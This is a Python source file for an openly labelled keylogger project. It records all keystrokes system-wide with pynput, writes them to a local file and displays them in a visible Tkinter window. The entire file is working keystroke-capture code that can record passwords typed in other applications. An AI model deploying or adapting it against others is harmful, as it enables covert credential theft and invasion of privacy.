from pynput.keyboard import Key, Listener
import tkinter as tk
from threading import Thread

log_file = "keylog.txt"
log = ""
listener_running = True

def on_press(key):
    global log, listener_running
    if not listener_running:
        return False

    try:
        log += key.char
    except AttributeError:
        if key == Key.space:
            log += ' '
        elif key == Key.enter:
            log += '\n'
        else:
            log += f' [{key}] '

    with open(log_file, "a") as f:
        f.write(log)
    update_text(log)
    log = ""

def on_release(key):
    if not listener_running:
        return False
    if key == Key.esc:
        return False

def update_text(new_text):
    text_widget.config(state=tk.NORMAL)
    text_widget.insert(tk.END, new_text)
    text_widget.config(state=tk.DISABLED)
    text_widget.see(tk.END)

def run_keylogger():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

def setup_gui():
    global text_widget
    app = tk.Tk()
    app.title("Keylogger Project By Virupakshi")

    frame = tk.Frame(app, padx=10, pady=10)
    frame.pack(padx=10, pady=10)

    label = tk.Label(frame, text="Logged Keystrokes:")
    label.pack(pady=5)

    text_widget = tk.Text(frame, wrap='word', state=tk.DISABLED, width=50, height=20)
    text_widget.pack(pady=5)

    app.protocol("WM_DELETE_WINDOW", on_closing)
    return app

def on_closing():
    global listener_running
    listener_running = False
    root.quit()

if __name__ == "__main__":
    root = setup_gui()

    listener_thread = Thread(target=run_keylogger)
    listener_thread.start()

    root.mainloop()
